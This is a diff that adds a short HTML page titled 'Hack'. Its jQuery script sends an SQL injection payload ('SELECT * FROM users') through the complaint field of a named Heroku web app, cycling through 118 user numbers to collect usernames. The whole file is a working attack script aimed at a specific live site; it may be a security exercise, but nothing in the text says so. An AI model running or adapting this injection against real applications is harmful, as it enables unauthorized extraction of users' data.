@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<title>Hack</title>
+	<script src="http://code.jquery.com/jquery-1.11.3.min.js"></script>
+</head>
+<body>
+<script>
+
+//  Returns an array with usernames and extra string
+for (var i = 1; i <= 118; i++){
+	var listUserNames = [];
+	var num = i;
+	var beginUrl = "http://securityone.herokuapp.com/complaint?utf8=%E2%9C%93&complaint=comment%3B+SELECT+*+FROM+users+WHERE+user_num+%3D+%2711%27%0D%0A%0D%0A&user_num=";
+	var url = beginUrl + num + "&commit=Submit+Complaint";
+	$.get(url, function(data){
+		listUserNames.push(data);
+	})
+}
+//  End of array with usernames
+
+
+
+
+</script>
+</body>
+</html>
